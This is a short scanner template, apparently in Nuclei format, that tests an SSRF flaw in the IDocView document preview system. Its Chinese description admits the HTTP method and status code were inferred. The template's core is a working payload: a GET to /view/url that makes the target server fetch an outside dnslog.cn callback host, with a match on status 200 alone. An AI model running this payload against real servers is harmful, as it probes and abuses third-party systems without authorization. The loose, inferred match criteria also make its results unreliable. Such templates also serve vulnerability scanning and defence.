id: poc-adcfe13add5819df1e7e
info:
  name: IDocView在线文档预览系统存在服务端请求伪造漏洞
  author: hacktwo
  severity: medium
  description: '[!] 推断说明: 状态码缺失, 推断为 200; 原文未标注HTTP方法, 推断为GET请求。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: ssrf,2025
http:
- raw:
  - 'GET /view/url?url=https://rmcmc0.dnslog.cn HTTP/1.1

    Host: {{Hostname}}'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
